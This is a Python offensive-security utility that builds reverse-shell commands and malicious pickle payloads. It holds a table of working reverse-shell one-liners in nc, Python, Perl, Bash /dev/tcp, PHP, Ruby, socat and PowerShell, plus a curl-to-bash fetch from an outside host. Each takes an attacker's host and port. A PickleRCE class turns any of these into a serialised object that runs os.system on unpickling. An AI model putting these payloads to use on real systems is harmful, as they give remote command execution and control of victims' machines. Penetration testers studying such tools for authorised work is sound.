import pickle
import os

#taken from https://github.com/lukechilds/reverse-shell
#and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
#call with str.format(host, port)
rev_shells = {
	"nc":
		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} > /tmp/f",
	"python":
		"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
	"python2":
		"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
	"perl":
		"""perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
	"bash":
		"/bin/sh -i >& /dev/tcp/{}/{} 0>&1",
	"nc2":
		"nc -e /bin/sh {} {}",
	"curl":
		"curl https://shell.now.sh/{}:{} | bash",
	"php":
		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
	"ruby":
		"""ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
	"socat":
		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
	"powershell":
		"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""""
}

def rev_shell(host, port, type):
	return rev_shells[type].format(host, port)

class PickleRCE:
	def __init__(self, cmd):
		self.cmd = cmd
	
	def __reduce__(self):
		return os.system, (self.cmd, )

def pickle_rev_shell(host, port, type="python", protocol=None):
	return pickle.dumps(PickleRCE(rev_shell(host, port, type)), protocol)

def main():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument("host")
	parser.add_argument("port", type=int)
	parser.add_argument("type", default="python")
	args = parser.parse_args()
	print(rev_shell(args.host, args.port, args.type))

if __name__ == "__main__":
	main()